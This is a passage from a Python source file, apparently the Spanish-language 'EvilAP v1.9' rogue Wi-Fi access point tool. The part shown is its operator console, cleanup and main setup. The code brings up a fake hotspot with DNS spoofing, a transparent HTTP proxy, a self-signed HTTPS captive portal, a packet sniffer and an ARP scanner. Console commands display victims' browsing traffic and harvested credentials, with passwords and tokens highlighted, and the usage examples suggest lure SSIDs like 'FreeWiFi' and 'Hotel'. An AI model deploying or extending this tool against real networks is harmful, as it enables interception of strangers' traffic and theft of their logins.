            with _lk_dns:   dr = len(dns_spoof)
            with _lk_creds: cc = len(all_creds)
            mc2 = G if PORTAL_MODE=="dns" else Y
            srv_info2 = f"-> {W}{USER_SRV}{X}" if USER_SRV else f"{DM}integrado{X}"
            print(f"\n{C}  AP:{X}       {W}{ap_cfg['ssid']}{X}  "
                  f"{'[WPA2]' if ap_cfg['password'] else f'{R}[OPEN]{X}'}  "
                  f"ch:{W}{ap_cfg['channel']}{X}  gw:{W}{ap_cfg['gateway']}{X}")
            print(f"{C}  Iface:{X}    {W}{AP_IFACE}{X}  NAT:{nat}")
            print(f"{C}  Portal:{X}   {W}{_portal_url()}{X}  [{mc2}{PORTAL_MODE.upper()}{X}]  {srv_info2}")
            print(f"{C}  Proxy:{X}    {W}{GW_IP}:{PROXY_PORT}{X}  {DM}(intercepta HTTP siempre){X}")
            print(f"{C}  DNS:{X}      {dlbl.get(dns_cfg['mode'],'?')}  custom:{W}{dr}{X}  {R}SIEMPRE LOCAL{X}")
            print(f"{C}  Clientes:{X} {W}{cnt}{X} total  {G}{aut}{X} con internet  creds:{R}{cc}{X}\n")

        elif cmd == "ipt":
            _, o1, _ = run("iptables -t nat -L EVILAP -n --line-numbers 2>/dev/null", silent=True)
            print(f"\n{C}  EVILAP (nat):{X}")
            for l in o1.splitlines(): print(f"    {W if l[0:1].isdigit() else DM}{l}{X}")
            _, o2, _ = run("iptables -L FORWARD -n --line-numbers 2>/dev/null", silent=True)
            print(f"\n{C}  FORWARD:{X}")
            for l in o2.splitlines(): print(f"    {DM}{l}{X}")
            print()

        elif cmd == "info":
            if not args: print(f"  {Y}info <id|ip>{X}"); continue
            ip = _resolve(args[0])
            if not ip: print(f"  {R}[!] No encontrado: {args[0]}{X}"); continue
            with _lk_clients:
                if ip not in clients: print(f"  {Y}No visto: {ip}{X}"); continue
                info = dict(clients[ip])
            cid    = _ip_to_id.get(ip, "?")
            activo = _is_active(info)
            auth   = f"{G}AUTH{X}" if info["authed"] else f"{Y}PORTAL{X}"
            print(f"\n{C}  {'='*56}{X}\n  {C}#{cid}{X}  {W}{BD}{ip}{X}  [{auth}]\n{C}  {'='*56}{X}")
            print(f"  {C}Hostname  :{X} {Y}{info.get('hostname') or '(desconocido)'}{X}")
            print(f"  {C}MAC       :{X} {W}{info.get('mac')      or '(pendiente)'}{X}")
            print(f"  {C}OS        :{X} {G}{info.get('os_guess') or '(no detectado)'}{X}")
            print(f"  {C}Activo    :{X} {G if activo else R}{'SI' if activo else 'NO'}{X}")
            print(f"  {C}Conectado :{X} {DM}hace {_since(info['connected_ts'])}{X}")
            if info.get("user_agents"):
                print(f"\n  {C}User-Agents:{X}")
                for ua in info["user_agents"][:3]: print(f"    {DM}{ua[:100]}{X}")
            if info.get("headers"):
                print(f"\n  {C}Headers:{X}")
                for k,v in info["headers"].items(): print(f"    {Y}{k:<22}{X}: {W}{v[:80]}{X}")
            print(f"\n  {DM}DNS:{len(info['dns'])}  HTTP:{len(info['http'])}"
                  f"  HTTPS:{len(info['https'])}  Creds:{R}{BD}{len(info['creds'])}{X}\n")

        elif cmd == "allow":
            if not args: print(f"  {Y}allow <id|ip> [id|ip...]{X}"); continue
            for arg in args:
                ip = _resolve(arg)
                if not ip: print(f"  {R}[!] No encontrado: {arg}{X}"); continue
                with _lk_clients: _init_client(ip); clients[ip]["authed"] = True
                net_allow(ip)
                cid = _ip_to_id.get(ip,"?")
                print(f"  {G}[+]{X} {C}#{cid}{X} {W}{ip}{X} -> {G}{BD}internet ON{X}  {DM}DNS sigue siendo local{X}")

        elif cmd == "revoke":
            if not args: print(f"  {Y}revoke <id|ip> [id|ip...]{X}"); continue
            for arg in args:
                ip = _resolve(arg)
                if not ip: print(f"  {R}[!] No encontrado: {arg}{X}"); continue
                with _lk_clients:
                    if ip in clients: clients[ip]["authed"] = False
                net_revoke(ip)
                cid = _ip_to_id.get(ip,"?")
                print(f"  {Y}[-]{X} {C}#{cid}{X} {W}{ip}{X} -> {Y}internet OFF{X}")

        elif cmd == "kick":
            if not args: print(f"  {Y}kick <id|ip>{X}"); continue
            for arg in args:
                ip = _resolve(arg)
                if not ip: print(f"  {R}[!] No encontrado: {arg}{X}"); continue
                with _lk_clients:
                    if ip in clients: clients[ip]["authed"] = False
                net_kick(ip)
                cid = _ip_to_id.get(ip,"?")
                print(f"  {R}[X]{X} {C}#{cid}{X} {W}{ip}{X} -> {R}{BD}BLOQUEADO{X}")

        elif cmd == "unblock":
            if not args: print(f"  {Y}unblock <id|ip>{X}"); continue
            for arg in args:
                ip = _resolve(arg)
                if not ip: print(f"  {R}[!] No encontrado: {arg}{X}"); continue
                net_unblock(ip)
                cid = _ip_to_id.get(ip,"?")
                print(f"  {G}[+]{X} {C}#{cid}{X} {W}{ip}{X} desbloqueado")

        elif cmd == "traffic":
            if not args: print(f"  {Y}traffic <id|ip>{X}"); continue
            ip = _resolve(args[0])
            if not ip: print(f"  {R}[!] No encontrado: {args[0]}{X}"); continue
            with _lk_clients:
                if ip not in clients: print(f"  {Y}No visto: {ip}{X}"); continue
                info = dict(clients[ip])
            cid  = _ip_to_id.get(ip,"?")
            auth = f"{G}AUTH{X}" if info["authed"] else f"{Y}PORTAL{X}"
            print(f"\n{C}  {'â'*52}{X}\n  {C}#{cid}{X}  {W}{BD}{ip}{X}  [{auth}]  "
                  f"conectado hace {DM}{_since(info['connected_ts'])}{X}")
            print(f"  Navegando: {G}{info.get('browsing','-')}{X}\n{C}  {'â'*52}{X}")
            if info["dns"]:
                print(f"\n  {DM}DNS ({len(info['dns'])}):{X}")
                for x in info["dns"][:30]: print(f"    {DM}{x}{X}")
            if info["http"]:
                print(f"\n  {Y}HTTP ({len(info['http'])}):{X}")
                for e in info["http"][-40:]:
                    sc = G if isinstance(e.get('status'),int) and 200<=e['status']<300 else R
                    print(f"    {DM}{e.get('t','')}{X}  {C}{e.get('method',''):<6}{X}  "
                          f"{W}{e.get('host','')}{X}{DM}{e.get('path','')[:50]}{X}  "
                          f"{sc}{e.get('status','')}{X}")
            if info["https"]:
                print(f"\n  {G}HTTPS ({len(info['https'])}):{X}")
                for x in info["https"][:30]: print(f"    {G}{x}{X}")
            if info["creds"]:
                print(f"\n  {R}{BD}CREDS ({len(info['creds'])}):{X}")
                for cr in info["creds"]:
                    print(f"    {DM}[{cr['proto']}]{X} {W}{cr['host']}{X}")
                    for k,v in cr["creds"].items():
                        print(f"      {C}{k.upper():<14}{X}: {W}{v}{X}")
            print()

        elif cmd == "creds":
            fip = _resolve(args[0]) if args else None
            with _lk_creds: snap = list(all_creds)
            if fip: snap = [e for e in snap if e["client"]==fip]
            if not snap:
                fid = f"#{_ip_to_id.get(fip,'?')} {fip}" if fip else ""
                print(f"\n  {Y}Sin credenciales{' para '+fid if fid else ''}{X}\n"); continue
            print(f"\n{R}{BD}  CREDENCIALES ({len(snap)}){X}\n")
            for e in snap:
                print(f"  {DM}[{e['time'][11:19]}]{X}  {Y}{e['client']:<15}{X}  "
                      f"{C}{e['proto']:<22}{X}  {W}{e['host']}{e['path']}{X}")
                for k,v in e["creds"].items():
                    isp = bool(re.search(r'pass|pwd|secret|pin|token',k,re.I))
                    print(f"    {C}{k.upper():<16}{X}: " + (f"{R}{BD}{v}{X}" if isp else f"{G}{v}{X}"))
            print()

        elif cmd == "dns":
            sub = args[0].lower() if args else ""
            if sub == "add":
                if len(args) < 3: print(f"  {Y}dns add <dom> <ip>{X}"); continue
                dom, ip = args[1].lower(), args[2]
                if not _valid_ip(ip): print(f"  {R}[!] IP invalida{X}"); continue
                with _lk_dns: dns_spoof[dom] = ip
                reload_dnsmasq(dns_cfg)
                print(f"  {G}[+]{X} {W}{dom}{X} -> {C}{ip}{X}")
            elif sub == "del":
                if len(args) < 2: print(f"  {Y}dns del <dom>{X}"); continue
                dom = args[1].lower()
                with _lk_dns:
                    if dom not in dns_spoof: print(f"  {Y}'{dom}' no encontrado{X}"); continue
                    del dns_spoof[dom]
                reload_dnsmasq(dns_cfg)
                print(f"  {R}[-]{X} {W}{dom}{X} eliminado")
            elif sub == "list":
                with _lk_dns: rules = dict(dns_spoof)
                if not rules: print(f"\n  {Y}Sin reglas custom{X}\n"); continue
                print(f"\n{W}  {'DOMINIO':<38} IP{X}\n  " + "â"*52)
                for d,ip in rules.items(): print(f"  {C}{d:<38}{X} {G}{ip}{X}")
                print()
            elif sub == "flush":
                with _lk_dns: dns_spoof.clear()
                reload_dnsmasq(dns_cfg)
                print(f"  {R}[-]{X} Todas las reglas DNS eliminadas")
            else:
                print(f"  {Y}Subcomandos: add del list flush{X}")

        elif cmd == "save":
            _do_save()

        elif cmd == "clear":
            os.system("clear")

        else:
            print(f"  {R}[!]{X} Desconocido: '{cmd}'  ({W}help{X})")

# =============================================================================
#  CLEANUP
# =============================================================================
def cleanup(sig=None, frame=None):
    print(f"\n{Y}[*]{X} Apagando EvilAP y restaurando sistema...")
    _do_save()
    for srv in [_portal_server_https, _proxy_server]:
        if srv:
            try: srv.shutdown()
            except: pass
    for p, n in [(proc_hostapd,"hostapd"),(proc_dnsmasq,"dnsmasq"),(proc_tcpdump,"tcpdump")]:
        if p and p.poll() is None:
            try: p.terminate(); p.wait(timeout=3); print(f"{G}[+]{X} {n} terminado")
            except:
                try: p.kill()
                except: pass
    run("pkill -f 'dnsmasq.*evil_ap' 2>/dev/null", silent=True)
    teardown_network()
    restore_dns_port()
    for f in [HOSTAPD_CONF, DNSMASQ_CONF, DNSMASQ_DYN, SSL_CERT, SSL_KEY]:
        try: f.unlink(missing_ok=True)
        except: pass
    print(f"{G}[+]{X} Sistema restaurado. Credenciales en {W}{_EXEC_DIR}/{X}")
    sys.exit(0)

# =============================================================================
#  ARGUMENTOS CLI
# =============================================================================
def parse_args():
    p = argparse.ArgumentParser(
        description="EvilAP v1.9",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 evilap.py
  sudo python3 evilap.py -i wlan1 --ssid FreeWiFi --mode dns --dns-mode wildcard
  sudo python3 evilap.py -i wlan1 --ssid Hotel --mode popup --portal-domain wifi.hotel
  sudo python3 evilap.py -i wlan1 --portal-server 10.0.0.1:5000
        """
    )
    p.add_argument("-i","--iface",        metavar="IFACE")
    p.add_argument("--ssid",              metavar="SSID")
    p.add_argument("--password",          metavar="PASS")
    p.add_argument("--channel",           metavar="CH")
    p.add_argument("--hw-mode",           metavar="MODE")
    p.add_argument("--gateway",           metavar="IP")
    p.add_argument("--nat",               metavar="IFACE")
    p.add_argument("--portal-domain",     metavar="DOMAIN")
    p.add_argument("--portal-server",     metavar="HOST:PORT")
    p.add_argument("--dns-mode",          metavar="MODE", choices=["wildcard","custom","off"])
    p.add_argument("--mode",              metavar="MODE", choices=["dns","popup"])
    p.add_argument("--ssl-cert",          metavar="PATH")
    p.add_argument("--ssl-key",           metavar="PATH")
    p.add_argument("--mac",               metavar="MAC")
    return p.parse_args()

# =============================================================================
#  MAIN
# =============================================================================
def main():
    global AP_IFACE, SSL_CERT_CUSTOM, SSL_KEY_CUSTOM

    cli = parse_args()
    banner()
    check_root()
    check_deps()

    TMP.mkdir(parents=True, exist_ok=True)
    DNSMASQ_LOG.touch()
    DNSMASQ_DYN.touch()
    CREDS_LOG.write_text(f"EvilAP v1.9  |  {ts_iso()}\n{'='*60}\n")
    CREDS_JSON.write_text("[]")
    TRAFFIC_JSON.write_text("{}")

    signal.signal(signal.SIGINT,  cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    if cli.ssl_cert: SSL_CERT_CUSTOM = cli.ssl_cert
    if cli.ssl_key:  SSL_KEY_CUSTOM  = cli.ssl_key

    # FIX: liberar :53 ANTES de cualquier config de red
    fix_dns_port()

    AP_IFACE = select_interface(preselected=cli.iface)
    print(f"{G}[+]{X} Interfaz: {W}{AP_IFACE}{X}")

    ap_cfg  = configure_ap(cli)
    ap_mac  = configure_mac(AP_IFACE, cli)
    nat_cfg = configure_nat(AP_IFACE, cli)
    configure_mode(cli)
    configure_portal_server(ap_cfg["gateway"], cli)
    configure_portal_domain(ap_cfg["gateway"], cli)
    dns_cfg = configure_dns(ap_cfg["gateway"], cli)

    dns_lbl  = {"1":f"WILDCARD -> {dns_cfg['spoof_ip']} (SIN upstream)",
                 "2":f"CUSTOM ({len(dns_cfg['custom'])} dominios)",
                 "3":"OFF (solo registro)"}
    srv_lbl  = f"Proxy a {USER_SRV}" if USER_SRV else "Portal integrado"
    mc       = G if PORTAL_MODE=="dns" else Y
    cert_info= f"personalizado: {SSL_CERT_CUSTOM}" if SSL_CERT_CUSTOM else "autofirmado"

    print(f"\n{C}+-- RESUMEN âââââââââââââââââââââââââââââââââââââââââââââ+{X}")
    print(f"  Interfaz  : {W}{AP_IFACE}{X}")
    print(f"  SSID      : {W}{ap_cfg['ssid']}{X}  Pass: {W}{ap_cfg['password'] or '(OPEN)'}{X}")
    print(f"  Canal     : {W}{ap_cfg['channel']}{X} / 802.11{ap_cfg['mode']}  GW: {W}{ap_cfg['gateway']}{X}")
    print(f"  Internet  : {W}{'NAT via '+nat_cfg['iface'] if nat_cfg['enabled'] else 'AISLADO'}{X}  {Y}(OFF hasta 'allow'){X}")
    print(f"  Portal    : {W}{_portal_url()}{X}  {DM}{srv_lbl}{X}")
    print(f"  Proxy HTTP: {W}{ap_cfg['gateway']}:{PROXY_PORT}{X}  {DM}intercepta HTTP pre y post auth{X}")
    print(f"  SSL cert  : {W}{cert_info}{X}")
    print(f"  Modo      : {mc}{PORTAL_MODE.upper()}{X}")
    print(f"  DNS spoof : {W}{dns_lbl.get(dns_cfg['mode'])}{X}")
    print(f"  {R}DNS NUNCA va a 8.8.8.8 para clientes (siempre local){X}")
    print(f"{C}+ââââââââââââââââââââââââââââââââââââââââââââââââââââââââ+{X}\n")

    if input(f"{B}[?]{X} Iniciar? [S/n]: ").strip().lower() == "n":
        print(f"{Y}Cancelado.{X}"); sys.exit(0)

    write_hostapd_conf(AP_IFACE, ap_cfg)
    write_dnsmasq_conf(AP_IFACE, ap_cfg, dns_cfg)
    setup_network(AP_IFACE, ap_cfg, nat_cfg, ap_mac)

    generate_self_signed_cert()
    start_transparent_proxy(ap_cfg["gateway"])
    start_portal_https(ap_cfg["gateway"])
    start_hostapd()
    start_dnsmasq()
    start_sniffer(AP_IFACE)
    start_dns_reader()
    start_arp_scanner()

    threading.Thread(
        target=lambda: [time.sleep(60) or _do_save() for _ in iter(int,1)],
        daemon=True
    ).start()

    print(f"\n{G}{'='*64}{X}")
    print(f"  {G}{BD}EvilAP v1.9 ACTIVO{X}  {W}{ap_cfg['ssid']}{X}  GW:{W}{ap_cfg['gateway']}{X}")
    print(f"  Portal : {W}{_portal_url()}{X}  [{mc}{PORTAL_MODE.upper()}{X}]")
    print(f"  Proxy  : {W}{ap_cfg['gateway']}:{PROXY_PORT}{X}")
    print(f"  DNS    : {R}SIEMPRE LOCAL{X}  ({dns_lbl.get(dns_cfg['mode'])})")
    print(f"{G}{'='*64}{X}\n")

    with patch_stdout(raw=True):
        run_console(ap_cfg, nat_cfg, dns_cfg)

if __name__ == "__main__":
    main()
